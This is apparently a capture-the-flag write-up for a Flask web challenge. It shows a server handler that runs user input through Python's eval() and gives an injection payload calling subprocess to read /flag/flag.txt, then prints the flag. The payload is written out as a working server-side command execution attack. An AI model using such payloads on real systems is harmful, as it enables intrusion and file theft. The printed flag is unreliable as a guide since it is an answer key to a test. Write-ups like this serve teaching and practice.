# David Byrne and co. Online Tailors 
### Category: Web Exploitation 
### Author: Emily Baird (Analytical Engine) 

## Description 
Something seems off about these guys' calculations...

The flag is in `/flag/flag.txt`

## Hints
There is a vulnerability in the way that the server takes user input and processes it.

## Solution
We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: 

```python 
if request.method == 'POST':
    size = request.form['inputShoulder']
    try:
        size = eval(size)
        jacket = (size * 20) + 2
    except:
        jacket = 'There was an error calculating your jacket size.'

    return render_template('index.html', size=size, jacket=jacket)
```

This exploit relies on the dangerous use of Python's `eval()` function. When passed a string, `eval` will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings, (ie, sending "1+1" will return `2`), we can also use it to send lines of code that we want Python to run. By using the `subprocess` library, we can execute shell commands from within Python. Especially useful is the `getoutput()` function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at `/flag/flag.txt`, we can craft the following payload:

    `__import__('subprocess').getoutput('cat /flag/flag.txt'))`

## Flag
magpie{4int_no_party_4int_n0_d1sc0}